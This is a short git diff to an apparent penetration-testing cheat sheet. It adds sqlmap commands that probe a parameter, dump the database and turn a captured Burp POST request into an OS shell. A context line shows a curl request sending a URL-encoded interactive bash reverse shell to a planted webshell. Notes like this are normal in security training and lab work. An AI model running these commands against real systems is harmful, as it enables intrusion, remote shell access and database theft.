@@ -144,10 +144,16 @@ curl $TargetIp/path/on/target/webshell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26
 ## Sqlmap
 
 https://sqlmap.org/
- 
+
+Test for vulnerabilities and dump the database:
 ```
 sqlmap -u http://ip/page.php?user=dummy -p user
-sqlmap -u http://ip/page.php?user=dummy -p user --dump
+sqlmap -u http://ip/page.php?user=dummy -p user --dump # time consuming
+```
+
+Intercept a `UNION SELECT` in Burp and record the `POST` as a file. Then use sqlmap to get a webshell:
+```
+sqlmap -r test.txt -p some_input_parameter_in_the_post_request --os-shell --web-root "/var/www/html/tmp"
 ```
 
 
